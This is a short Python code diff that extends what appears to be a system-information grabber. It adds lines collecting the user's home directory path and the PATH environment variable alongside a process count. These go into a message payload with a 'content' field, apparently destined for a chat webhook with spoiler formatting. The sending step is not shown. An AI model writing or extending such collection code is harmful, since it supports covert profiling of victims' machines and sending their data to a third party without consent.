@@ -69,7 +69,14 @@ try:
 	info.append(f"APPLICATION COUNT: || {sum(1 for _ in psutil.process_iter())} ||")
 except:
 	print("system error.")
-
+try:
+	info.append(f"MAIN PATH: || {os.path.expanduser("~")} ||")
+except:
+	print("system error.")
+try:
+	info.append(f"EXECUTABLE PATH: || {os.environ['PATH']} ||")
+except:
+	print("system error.")
 info.append(f"-")
 try:
 	data = {"content": "\n".join(info)}
